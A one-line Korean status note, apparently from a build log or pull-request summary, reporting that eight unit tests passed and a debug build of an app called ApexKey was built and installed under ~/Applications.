- 단위 테스트 8건 통과, debug 빌드/설치 완료 (`~/Applications/ApexKey.app`)